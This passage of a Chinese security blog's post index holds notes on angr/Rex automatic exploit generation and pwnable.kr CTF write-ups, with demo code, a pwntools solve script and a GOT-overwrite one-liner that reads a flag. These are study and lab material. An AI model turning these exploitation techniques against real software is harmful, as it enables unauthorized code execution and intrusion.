类用以复现漏洞并返回漏洞类型，Exploit类用以判定漏洞的可利用性，并生成 exploit。171 ~ 174 行代码用以验证 Exploit 的有效性。 0x02 漏洞复现采用 concolic-execution 复现 Crash 状态，相关功能在 Crash 类中实现。在本例中，初始化 rex.Crash()时，共传入以下参数： :param binary: vuln_stacksmash 全路径 :param crash: PoC :param fast_mode: 传入 True，代表将 Angrop 设置为快速查找模式 :param rop_cache_path: 从该文件中查找 gadgets :param tracer_args 1、Concrete Execution通过 QEMU 加载二进制程序，以 PoC 为输入运行，复现 crash_state，运行结果如下： 2、Concolic Execution在获取到 Crash state 之后，基于 Angr 实现 Concolic Execution。首先设置程序初始状态。 使用 ‘posix’、’preconstrainer’ 插件辅助分析： 使用 ‘Tracer’、’Oppologist’ 两种 Exploration_techniques： 设置 simulation_manager ： 执行结果: 0x03 漏洞类型判定_triage_crash() 函数依据原理对漏洞类型进行判定。 执行结果为 IP_OVERWRITE： 0x04 可利用性判定仅对以下十二类漏洞能够生成 Exploit。 0x05 ExploitFactory代码中设置了 rop_leak_memory、rop_set_register、 explore_for_exploit 三种利用方式。读过源码后发现， rop_leak_memory、rop_set_register 均是针对 CGC 格式文件的利用技术。 在已有的九种 exploit_technique 中，仅有 call_jmp_sp_shellcode、call_shellcode、rop_to_system 用以针对 elf 文件。执行结果如下： 0x06 Verified对三种生成结果进行确认。 0x07 小结通过阅读并调试 test_linux_stacksmash()，直观感受了 Rex 对栈溢出漏洞的利用过程，加深了对 Rex 的理解，特别是采用 concolic-execution 复现 Crash 部分。但目前对其中的 Explore_technique、Exploit_technique 等内容理解并不深入，在后续学习过程中逐步完善。","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[{"name":"CGC","slug":"CGC","permalink":"http://maskhed.github.io/tags/CGC/"}]},{"title":"angr AEG：缓冲区溢出之 Exploit 自动生成","slug":"insomnihack-aeg","date":"2019-01-09T13:37:50.000Z","updated":"2019-03-01T07:17:00.048Z","comments":true,"path":"2019/01/09/insomnihack-aeg/","link":"","permalink":"http://maskhed.github.io/2019/01/09/insomnihack-aeg/","excerpt":"insomnihack_aeg 为官方提供的示例，用以展示 Angr 利用符号执行进行漏洞挖掘并自动生成 Exploit 的能力。代码 demo_bin.c 中存在堆溢出漏洞，通过脚本 solver.py 成功挖掘出该漏洞并自动生成 Exploit。","text":"insomnihack_aeg 为官方提供的示例，用以展示 Angr 利用符号执行进行漏洞挖掘并自动生成 Exploit 的能力。代码 demo_bin.c 中存在堆溢出漏洞，通过脚本 solver.py 成功挖掘出该漏洞并自动生成 Exploit。 0x00 demo_bin.c典型的堆溢出，第 21 行，由于未对边界条件进行检查，溢出数据覆盖函数指针，当 38 行调用 do_something() 时，导致 Crash。完整代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char component_name[128] = &#123;0&#125;;typedef struct component &#123; char name[32]; int (*do_something)(int arg);&#125; comp_t;int sample_func(int x) &#123; printf(\" - %s - recieved argument %d\\n\", component_name, x);&#125;comp_t *initialize_component(char *cmp_name) &#123; int i = 0; comp_t *cmp; cmp = malloc(sizeof(struct component)); cmp-&gt;do_something = sample_func; printf(\"Copying component name...\\n\"); while (*cmp_name) cmp-&gt;name[i++] = *cmp_name++; cmp-&gt;name[i] = '\\0'; return cmp;&#125;int main(void)&#123; comp_t *cmp; printf(\"Component Name:\\n\"); read(0, component_name, sizeof component_name); printf(\"Initializing component...\\n\"); cmp = initialize_component(component_name); printf(\"Running component...\\n\"); cmp-&gt;do_something(1);&#125; 0x01 Solve.py漏洞原理很简单，不再赘述。利用符号执行判断是否存在控制流劫持，关键在于检测 EIP，若 EIP 完全被符号变量覆盖，则代表着控制流已被劫持。完整的 AEG 过程如下：1）漏洞挖掘，带有前置约束及路径选择策略的符号执行；2）分析发生崩溃时的 EIP 状态；3）分析发生崩溃时的内存布局4）构造约束条件；5）约束求解，生成 Exploit。 1、漏洞挖掘脚本中第 13 ~ 24 行，利用 SimulationManager 的 step() 方法，搜索二进制程序的状态空间。由于代码逻辑较为简单，因此在路径探索的过程中并未添加缓解路径爆炸的前置约束，也未采用路径选择策略，仅使用简单的 step()。循环执行，直到出现 unconstrained 状态。 1234567891011121314151617181920212223242526p = angr.Project(binary)binary_name = os.path.basename(binary)extras = &#123;so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY&#125;es = p.factory.entry_state(add_options=extras)sm = p.factory.simulation_manager(es, save_unconstrained=True)# find a bug giving us control of PCl.info(\"looking for vulnerability in '%s'\", binary_name)exploitable_state = Nonewhile exploitable_state is None: print(sm) sm.step() if len(sm.unconstrained) &gt; 0: l.info(\"found some unconstrained states, checking exploitability\") for u in sm.unconstrained: if fully_symbolic(u, u.regs.pc): exploitable_state = u break # no exploitable state found, drop them sm.drop(stash='unconstrained')l.info(\"found a state which looks exploitable\")ep = exploitable_state 2、分析 EIP当检测到 unconstrained states 时，调用 fully_symbolic()方法，查看 EIP 中符号变量的数量。当 EIP 完全被符号变量覆盖时，代表控制流已被劫持。 12345678910def fully_symbolic(state, variable): ''' check if a symbolic variable is completely symbolic ''' for i in range(state.arch.bits): if not state.solver.symbolic(variable[i]): return False return True fully_symbolic()接收 state、variable 两个输入，用 state.arch.bits 判断所模拟系统的字长（The number of bits in a word），用 symbolic() 检测传入数据是否为符号值。该方法在“./angr/state_plugins/solver.py”中，实现代码如下： 1234567def symbolic(self, e): # pylint: disable=R0201 \"\"\" Returns True if the expression `e` is symbolic. \"\"\" if type(e) in (int, bytes, float, bool): return False return e.symbolic 在触发漏洞时，堆及 EIP 状态如下图所示。调试结果如下： 3、分析内存状态在满足unconstrained，且 EIP 完全被符号变量覆盖时，通过 find_symbolic_buffer() 检测内存中符号变量的布局情况，并构造约束条件。整个环节可分为查找符号输入、追踪符号变量、构造约束条件三个步骤。 12345# keep checking if buffers can hold our shellcodefor buf_addr in find_symbolic_buffer(ep, len(shellcode)): l.info(\"found symbolic buffer at %#x\", buf_addr) memory = ep.memory.load(buf_addr, len(shellcode)) sc_bvv = ep.solver.BVV(shellcode) 1）查找符号输入查找符号输入、追踪符号变量在find_symbolic_buffer()中实现，代码如下： 12345678910111213141516def find_symbolic_buffer(state, length): ''' dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's control ''' # get all the symbolic bytes from stdin stdin = state.posix.stdin sym_addrs = [ ] for _, symbol in state.solver.get_variables('file', stdin.ident): sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables)))) for addr in sym_addrs: if check_continuity(addr, sym_addrs, length): yield addr 此处需注意，Angr 在处理 scanf 的输入数据时，采用 streams 模式。不仅如此，默认情况下，stdin、stdout、stderr 均采用该模式。原文如下 Believe it or not, this simpler abstraction for streams will benefit symbolic execution. Consider an example program that calls scanf N times to read in N strings. With a traditional SimFile, as we do not know the length of each input string, there does not exist any clear boundary in the file between these symbolic input strings. In this case, angr will perform N symbolic reads where each read will generate a gigantic tree of claripy ASTs, with string lengths being symbolic. This is a nightmare for constraint solving. Nevertheless, the fact that scanf is used on a stream (stdin) dictates that there will be zero overlap between individual reads, regardless of the sizes of each symbolic input string. We may as well model stdin as a stream that comprises of consecutive packets, instead of a file containing a sequence of bytes. Each of the packet can be of a fixed length or a symbolic length. Since there will be absolutely no byte overlap between packets, the constraints that angr will produce after executing this example program will be a lot simpler.The key concept involved is “short reads”, i.e. when you ask for n bytes but actually get back fewer bytes than that. We use a different class implementing SimFileBase, SimPackets, to automatically enable support for short reads. By default, stdin, stdout, and stderr are all SimPackets objects. 调试结果与文档描述一致： 2) 追踪符号变量state.posix.stdin为传入程序的全部符号变量，使用state.solver.get_variables() 追踪内存中的符号变量。该函数位于“./angr/state_plugins/solver.py”中，代码如下： 1234567891011121314151617181920212223242526def get_variables(self, *keys): \"\"\" Iterate over all variables for which their tracking key is a prefix of the values provided. Elements are a tuple, the first element is the full tracking key, the second is the symbol. &gt;&gt;&gt; list(s.solver.get_variables('mem')) [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;)] &gt;&gt;&gt; list(s.solver.get_variables('file')) [(('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)] &gt;&gt;&gt; list(s.solver.get_variables('file', 2)) [(('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)] &gt;&gt;&gt; list(s.solver.get_variables()) [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;), (('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)] \"\"\" for k, v in self.eternal_tracked_variables.items(): if len(k) &gt;= len(keys) and all(x == y for x, y in zip(keys, k)): yield k, v for k, v in self.temporal_tracked_variables.items(): if k[-1] is None: continue if len(k) &gt;= len(keys) and all(x == y for x, y in zip(keys, k)): yield k, v 返回值为元组，调试结果如下: 通过 state.memory.addrs_for_name() 返回包含符号变量的内存地址。 123456def addrs_for_name(self, n): \"\"\" Returns addresses that contain expressions that contain a variable named `n`. \"\"\" return self.mem.addrs_for_name(n) 调试结果：至此，已能够通过输入数据控制 EIP 以及部分内存空间，后续要考虑的是 Payload 的布局问题。 3）构造约束条件Exploit 采用 ret2text 方式且不考虑安全机制，因此仅需找到一片足以放置 shellcode 的连续地址即可。示例中 shellcode 大小为 22。检查空间连续性的函数如下： 1234567891011def check_continuity(address, addresses, length): ''' dumb way of checking if the region at 'address' contains 'length' amount of controlled memory. ''' for i in range(length): if not address + i in addresses: return False return True 成功执行后，返回满足条件的起始地址，并将shellcode 转换为 BVV。 12memory = ep.memory.load(buf_addr, len(shellcode))sc_bvv = ep.solver.BVV(shellcode) 至此，构造生成 Exploit 的约束条件如下： memory == sc_bvv ep.regs.pc == buf_addr 4、约束求解通过 satisfiable() 检查约束条件是否可解。 1234567# check satisfiability of placing shellcode into the address if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)): l.info(\"found buffer for shellcode, completing exploit\") ep.add_constraints(memory == sc_bvv) l.info(\"pointing pc towards shellcode buffer\") ep.add_constraints(ep.regs.pc == buf_addr) break 约束可解，生成 Exploit。 123456filename = '%s-exploit' % binary_namewith open(filename, 'wb') as f: f.write(ep.posix.dumps(0)) print(\"%s exploit in %s\" % (binary_name, filename))print(\"run with `(cat %s; cat -) | %s`\" % (filename, binary)) 0x02 总结该示例完整展示了 AEG 的全过程。通过调试，加深了对符号执行的理解。由于本例并不涉及符号执行所面临的路径爆炸与路径选择，因此对于理解前置约束条件及路径选择策略的助益并不明显，但对于理解符号变量以及内存布局还是起到一些作用。对于 AEG 来说，由于约束求解的问题不在考虑范围之内，控制流劫持的检测基本聚焦为 EIP 的检测。因此，如何根据崩溃点的内存布局及 Payload 情况，构造出合适的约束条件，成为问题的关键。","categories":[{"name":"Angr","slug":"Angr","permalink":"http://maskhed.github.io/categories/Angr/"}],"tags":[]},{"title":"软件漏洞分析","slug":"Vulnerability-Analysis-Method","date":"2018-12-20T03:27:27.000Z","updated":"2018-12-20T04:01:40.647Z","comments":true,"path":"2018/12/20/Vulnerability-Analysis-Method/","link":"","permalink":"http://maskhed.github.io/2018/12/20/Vulnerability-Analysis-Method/","excerpt":"从理论层面对漏洞分析进行定义，并对常用漏洞分析方法进行总结。","text":"从理论层面对漏洞分析进行定义，并对常用漏洞分析方法进行总结。 软件漏洞分析的定义 广义漏洞分析：指的是围绕漏洞所进行的所有工作，包括： 漏洞挖掘：使用程序分析或软件测试技术发现软件中可能存在的未知的安全漏洞 漏洞检测：又称漏洞扫描，基于漏洞特征库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，以发现可利用的已知漏洞 漏洞应用：借助漏洞堆软件或其依附的目标系统进行模拟攻击，并且对攻击代码进行生存性验证 漏洞消除：对漏洞进行修复，包括漏洞防御、补丁修复、安全加固等 漏洞管控：包括漏洞收集与发布、漏洞资源的积累与分析、漏洞的准则规范的制定等 狭义漏洞分析：特指漏洞挖掘，包括： 架构安全分析：在设计阶段进行软件架构分析，从更高、更抽象的层次保障软件安全性 源代码漏洞分析：通常使用静态分析方法，整个过程包括源代码模型构造、漏洞模式提取、基于软件模型和漏洞模式的模式匹配 二进制漏洞分析：包括静态分析和动态分析两种 运行系统漏洞分析：分析对象是已经实际部署的软件系统，通过信息收集、漏洞检测和漏洞确认三个基本步骤堆软件系统进行漏洞分析 软件分析技术概述 技术类别 基本原理 分析阶段 分析对象 分析结果 优点 缺点 软件架构安全分析 通过对软件架构进行建模，并对软件的安全需求或安全机制进行描述，然后检查架构模型直至满足所有安全需求 软件设计 软件架构 设计错误 考虑软件整体安全性，在软件设计阶段进行 缺少实用且自动化程度高的技术 源代码漏洞分析 通过对程序代码的模型提取及程序检测规则的提取，利用静态的漏洞分析技术分析结果 软件开发 源代码 代码缺陷 代码覆盖率高，能够分析出隐藏较深的漏洞，漏报率较低 需要人工辅助，技术难度大，对先验知识（历史漏洞）依赖性较大，误报率较高 二进制漏洞分析 通过对二进制可执行代码进行多层次（指令级、结构化、形式化等）、多角度（外部接口测试、内部结构测试等）的分析，发现软件程序中的安全缺陷和安全漏洞 软件设计、测试及维护 二进制代码 程序漏洞 不需要源代码，漏洞分析准确度较高，实用性广泛 缺乏上层的结构信息和类型信息，分析难度大 运行系统漏洞分析 通过向运行系统输入特定构造的数据，然后对输出进行分析和验证的方式来检测运行系统的安全性 运行及维护 运行系统 配置缺陷 考虑由多种软件共同构成的运行系统的整体安全性，检测项全面，准确度高 对分析人员的经验依赖度较大 源代码漏洞分析 技术 基本原理 优点 缺点 典型工具 数据流分析 数据流分析是一种用于收集计算机程序在不同点计算的值的信息的技术。进行数据流分析的最简单的一种形式就是对控制流图的某个节点建立数据流方程，然后通过迭代计算，反复求解，直到到达不动点 具有更强的分析能力，适合需要考虑控制流信息且变量属性之操作十分简单的静态分析问题 分析效率低，过程间分析和优化算法复杂，编程工作量大，容易出错且效率低 Coverity, Prevent, Llocwork, Fortify, SCA, FindBugs, Checkmax 符号执行 符号执行是指用符号值替代真实值，模拟程序的执行，从而得到程序的内部结构及其相关信息，从而产生有针对性的测试用例 生成的测试用例有针对性，测试覆盖率较高，可以检测到深层次的问题 在进行系统化的符号执行时，会产生路径爆炸或是求解困顿等问题 EXE, KLEE, Clang, DART 污点分析 该技术对输入的数据建立污点传播标签，之后静态地跟踪被标记数据的传播过程，检查是否有危险函数或是危险操作 该技术的优点在于可以通过对数据的传播快速地找到典型的与输入数据相关的漏洞 该技术有时会受到编译器优化的影响，同时需要构造污点传播树，这种树的构造比较复杂，有时需要人工介入 Pixy, TAJ 模型检测 该技术主要通过将程序转换为逻辑公式，然后使用公理和规则来证明程序是否是一个合法的定理。如果程序合法，那么被测程序便满足先前所要求的安全特性 对路径的分析敏感，对于路径、状态的结果具有很高的精确性；检验并发错误能力较好，验证过程完全自动化 由于穷举了所有可能状态，增加了额外的开销；数据密集度较大时，分析难度很大；对时序、路径等属性，在边界处的近似处理难度大 SLAM, MOPS, Bandera 定理证明 该方法主要是将原有程序验证中由研究人员手工完成的分析过程变为自动推导，其主要目的是证明程序计算中的特性 使用严格的推导证明控制检测的进行，误报率低 某些域上的公式推导缺乏适用性，对新漏洞扩展性不高 ESC, Saturn 二进制漏洞分析 技术 基本原理 应用范围 优点 缺点 典型工具 模糊测试 向被测程序发送随机或预先给定的数据 以文件、网络数据或是本地输入以其他对外部输入数据依赖较大的软件 原理简单，执行所需计算量较少，相关工具较为成熟，可以很方便地应用于大型软件的测试中 测试用例针对性低，覆盖率较低，测试结果不确定性较大 SPIKE, Peach, Sully, BeStorm, MU-4000 动态污点分析 对输入数据建立污染标签，在程序内部处理数据的同时加入污染标签的传播，通过分析标签的传播得出程序的内部结构 以文件、网络数据或是本地输入及其他对外部输入数据依赖较大的软件 可以获取程序内部的基本信息，易于发现与输入关联度较大的漏洞 需要动态插桩或是虚拟化等技术支持，实现较为复杂，并且污染传播算法对分析结果影响较大 TaintCheck, Dyta, Argos, Temu 基于模式的漏洞分析 利用中间表示语言或是其他工具将漏洞抽象为具有一定特殊性的模式，最终通过找到这种模式进而找到相关漏洞 需要对被分析漏洞表现形式有较深了解，并且需要对被分析软件进行一定转化 对漏洞表现形式抽象程度较高，随着建模准确度的提升，漏洞分析的准确度和速度都会有很大提升，代表着未来研究的方向 目前的漏洞建模较为简单，有时误报率较高 BinNavi 二进制代码比对 通过比对不同二进制文件，尤其是补丁文件与原文件之间的差异获取修改信息，从而定位并获取漏洞信息 需要有针对某一漏洞的补丁文件或是两个不同版本的同型软件 算法较为成熟，实现简单，有许多相关使用工具 由于需要补丁或新版软件的比对，所以该类技术仅能发现已被报告并修复的漏洞 Bindiff, IDA Compare, eEye Binary Diffing Suite 智能灰盒测试 利用动态符号执行等技术，针对被测软件生成有针对性的测试用例，从而提高测试用例的覆盖能力 以文件、网络数据或是本地输入及其他对外部输入数据依赖较大的软件 可以有效提升测试用例的覆盖率，从而提高发现漏洞的可能性 由于算法和计算量等问题，在使用时容易出现路径爆炸和求解困顿等问题，对大型软件的测试效果不是很理想 SAGE, SmartFuzz 运行系统漏洞分析 技术 基本原理 应用范围 优点 缺点 典型工具 配置管理测试 配置管理测试是对运行系统配置进行安全性测试，检查系统各配置是否符合运行系统的安全需求和制定的安全策略 检查配置漏洞 可以全面地分析和检查运行系统的配置项 需要对运行系统的业务需求，业务类型和运行环境有充分的了解，需要更多的人工介入 MBSA, Metasploit 通信协议测试 通信协议验证是对运行系统通信协议中潜在的安全漏洞进行检测。攻击验证是常用的通信协议验证手段。它利用已知的攻击手段对运行系统进行模拟攻击以判断通信协议是否存在某种类型的安全漏洞 检测通信协议中潜在的漏洞 攻击验证的通信协议验证手段检测结果较为准确，能够用于大规模运行系统 攻击验证方法只适用于某些特定类型的通信协议安全漏洞检测 Nessus, Nmap 授权认证测试 认证测试通过了解运行系统的授权、认证工作流程来尝试规避运行系统的授权、认证机制 检测运行系统中授权、认证机制中潜在的漏洞 分析结果较为准确 该类技术需要深入了解运行系统的授权认证工作，需要较多的人工参与分析工作 Nessus, WebScarab 数据验证测试 数据验证测试目的在于发现由于运行系统没有正确验证来自客户端或外界的数据而产生的安全漏洞。该类技术主要通过构造特定的输入以检测是否可以触发运行系统的某些特定类型安全漏洞 检测运行系统中授权、认证机制中潜在的漏洞 技术比较成熟，可用工具较多，操作简单 分析结果误报率比较高 MVS, AppScan 数据安全性验证 数据安全性验证旨在发现威胁运行系统内部数据自身安全性的漏洞 检测运行系统中在存储和传输数据时潜在的漏洞 技术比较成熟，可用工具较多，操作简单 分析结果误报率比较高 WireShark 参考资料 《软件漏洞分析技术》","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[]},{"title":"Pwnable（三）","slug":"Pwnable-3","date":"2018-12-14T10:52:42.000Z","updated":"2018-12-20T04:00:28.887Z","comments":true,"path":"2018/12/14/Pwnable-3/","link":"","permalink":"http://maskhed.github.io/2018/12/14/Pwnable-3/","excerpt":"本文主要解决 pwnable 中的第六题 “random” 与第七题 “input”，涉及的知识点为伪随机数生成函数 random()与 Linux 基础知识。","text":"本文主要解决 pwnable 中的第六题 “random” 与第七题 “input”，涉及的知识点为伪随机数生成函数 random()与 Linux 基础知识。 Random题目涉及知识点为伪随机数生成函数 rand()。rand()函数在生成随机数时，依赖初始“种子”值，该值可通过 srand() 进行指定。在未指定“种子”值时，rand() 以“1”为默认“种子”，每次生成的值为固定值。random.c 中的代码如下：123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; &#125; printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;&#125; 通过代码可知，仅需将 random 与 “0xdeadbeef” 进行异或运算，即可求出所需输入 key。在目标服务器上进行测试，random()为固定值 “1804289383”，运算 1804289383 ^ 0xDEADBEEF = 3039230856，因此输入数据为“3039230856”。 Input本题涉及的知识点如下表所示。由于特殊字符“\\x00”会导致输入数据的截断，因此需要通过编写脚本来获取 flag。看过各位大佬所写的 writeup，脚本的编写分为 C 语言版本与 Python 版本。由于个人近期在学习 pwntools，因此选用 Python 编写脚本，同时加深对 pwntools 的理解。 知识点 解题技巧 命令行参数传递 argv[‘A’] 等同于 argv[65] I/O 重定向 使用 pipe 或 pwntools 环境变量 env 默认值为系统环境变量，可通过指定 env 传入程序 文件读写 普通的文件读写操作 socket 普通的 socket 通信过程 Input.c 中的源码如下所示，共 5 个 Puzzle：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(\"bind error, use another port\\n\"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf(\"accept error, tell admin\\n\"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0;&#125; 在解题时，首先将 stdin、stderr 与 “\\x0a” 所需的内容保存为文件。由于服务器中只有“/tmp”目录具有写权限，因此在“/tmp”目录下建立“/tmp/l0l/”目录，并将所需文件保存在该目录下。 1234python -c 'print \"\\x00\\x0a\\x00\\xff\"' &gt; /tmp/l0l/stdinpython -c 'print \"\\x00\\x0a\\x02\\xff\"' &gt; /tmp/l0l/stderrpython -c 'fd = open(\"/tmp/l0l/\"+\"\\x0a\", \"w\"); fd.write(\"\\x00\\x00\\x00\\x00\"); fd.close()'ln -s /home/input2/flag /tmp/l0l/flag 对应的解题脚本如下： 123456789101112131415161718192021222324252627282930313233343536from pwn import *import osargv = []for i in range(0,100): argv.append(\"\")argv[0] = \"/home/input2/input\"argv[65] = \"\\x00\"argv[66] = \"\\x20\\x0a\\x0d\"# Stage 1 cleared.# input2@ubuntu:~$ python -c 'print \"\\x00\\x0a\\x02\\xff\"' &gt; /tmp/l0l/stderr# input2@ubuntu:~$ python -c 'print \"\\x00\\x0a\\x00\\xff\"' &gt; /tmp/l0l/stdin# Stage 2 cleared (Change the files stdin and stderr refer to in the process call)env = &#123;&#125;env[\"\\xde\\xad\\xbe\\xef\"] = \"\\xca\\xfe\\xba\\xbe\"# Stage 3 cleared (Add env to the process call)# $ python -c 'fd = open(\"/tmp/l0l\"+\"\\x0a\", \"w\"); fd.write(\"\\x00\\x00\\x00\\x00\"); fd.close()'# Stage 4 cleared (Run the python file from /tmp directory)argv[67] = \"11123\"# Stage 5 cleared (Run the client executable when in interactive mode)# Last step is to create a symlink from flag to /home/input2/flagp = process(argv=argv, stdin=open(\"/tmp/lulz/stdin\", \"r\"), stderr=open(\"/tmp/lulz/stderr\", \"r\"), env=env)p.interactive() 此时，利用 socket 向 pwnable.kr:11123 发送 “\\xde\\xad\\xbe\\xef” 即可。实现方式有多种，此处依然使用 pwntools，代码如下： 1234from pwn import *s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((\"127.0.0.1\", 11123))s.send(\"\\xde\\xad\\xbe\\xef\") 获取到 flag 如下。 参考文献《Writeup.pwnable.kr系列之input》 《pwnable.kr - Toddler’s Bottle》","categories":[{"name":"PWN","slug":"PWN","permalink":"http://maskhed.github.io/categories/PWN/"}],"tags":[]},{"title":"Pwnable（二）","slug":"Pwnable-2","date":"2018-12-08T13:54:45.000Z","updated":"2019-02-19T08:55:41.175Z","comments":true,"path":"2018/12/08/Pwnable-2/","link":"","permalink":"http://maskhed.github.io/2018/12/08/Pwnable-2/","excerpt":"本文为 pwnable.kr 第五关 passcode 的 writeup。题目中主要涉及变量未初始化、格式化字符串与GOT表覆写三个知识点，变量未初始化与格式化字符串造成 WRITE_WHAT_WHERE，结合GOT表覆写，最终获取到 Flag。","text":"本文为 pwnable.kr 第五关 passcode 的 writeup。题目中主要涉及变量未初始化、格式化字符串与GOT表覆写三个知识点，变量未初始化与格式化字符串造成 WRITE_WHAT_WHERE，结合GOT表覆写，最终获取到 Flag。 0x00 背景知识本节仅简要介绍 GOT/PLT 基本概念，详细内容可自行查阅，其中涉及的 ELF 文件格式可参考《ELF_Format》。 GOT（Global Offset Table）：GOT 位于 .got.plt section 中，用以记录 ELF 文件中所用到的共享库中符号的绝对地址。程序初始化时，GOT 表项为空，当符号被首次调用时会动态解析对应地址，并将该地址保存在 GOT 中，之后再次调用该符号时，无需解析，直接跳转至 GOT 表中所保存的地址。 PLT（Procedure Linkage Table）：PLT 位于 .plt section 中，用以将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。 当前的操作系统一般都支持 NX 特性，通常情况下 PLT 具有可执行权限(X)，没有写(W)权限；GOT 具有写权限，却不可执行。这是由于链接器运行时填充的区域，必须是可写的，但可写的区域一般不可执行，对于外部函数来说需要引入一个可执行的区域作为引导，这就是PLT的作用。同时，这也是将 PLT 与 GOT 分开的原因。下图展示了 GOT 表中存有对应符号地址时的寻址过程。 0x01 变量未初始化 登录服务器后查看当前目录，共有 passcode.c、passcode、flag 三个文件。尝试读取 flag 内容，提示权限不够。执行 passcode，产生段错误。 查看 passcode.c 文件，发现 login() 函数中的局部变量未初始化，且 main() 函数中 welcome() 与 login() 连续调用，推测两函数 ebp 相同。 利用 GDB 对 passcode 进行调试，输入 120 个 ’A‘，由于代码中对输入长度进行了限制，因此 welcome() 函数中的 scanf() 仅接收 100 个字节。此时栈内数据如图所示。 继续调试，跟进 login() 函数，查看栈布局，发现 24 个字节被 ’A‘ 污染。对比 login() 汇编代码与源代码，分析后可知，通过构造 welcome() 函数中的输入数据，可实现对 login() 函数中 passcode1 变量中所存储内容的完全控制。 0x02 scanf()再次检查 passcode.c 文件，发现 scanf() 第二个参数缺少 &amp;。查看对应汇编代码，其中取地址时使用了 mov 而非 lea 指令，这使得scanf()产生内存写入漏洞。至此，利用变量未初始化与 scanf() ，已可实现 WRITE_WHAT_WHERE。 0x03 GOT 覆写查看 passcode 开启的安全选项，RELRO 选项为”Partial RELRO“，意味着可以采用GOT表覆写技术实现攻击。 查看 section 信息，发现 GOT 具有写权限。 至此，思路已清晰，将passcode1 中所存储的内容布局为随后将会调用的 fflush() 函数地址，并在调用到 scanf(“%d”, passcode1) 时输入 passcode 中调用 system(“/bin/cat flag”) 时的地址即可。 程序没有开启 PIE，无需 leak，通过 GOT 表获取到 fflush() 地址 “0x0804a004”。 获取 passcode 中调用 system(“/bin/cat flag”) 时的地址，“0x080485e3” (0x080485e3==134514147) 构造exp如下并成功获取到 flag： python -c &quot;print 96*&#39;A&#39;+&#39;\\x04\\xa0\\x04\\x08&#39;+&#39;134514147&#39;&quot; | ./passcode” 参考《通过 GDB 调试理解 GOT/PLT》《Linux Debugging（七）: 使用反汇编理解动态库函数调用方式GOT/PLT》《深入了解GOT,PLT和动态链接》《利用got表pwn学习》《Writeup.pwnable.kr系列之passcode》《[Pwnable.kr] passcode writeup – Toddler’s bottle》《Pwnable.kr - passcode》","categories":[{"name":"PWN","slug":"PWN","permalink":"http://maskhed.github.io/categories/PWN/"}],"tags":[]},{"title":"Pwnable（一）","slug":"Pwnable-1","date":"2018-12-07T08:46:57.000Z","updated":"2018-12-20T03:59:51.206Z","comments":true,"path":"2018/12/07/Pwnable-1/","link":"","permalink":"http://maskhed.github.io/2018/12/07/Pwnable-1/","excerpt":"作为刚接触 PWN 的菜鸡，在学习相关知识的同时，通过 pwnable.kr来检验学习成果。本文记录了 pwnable 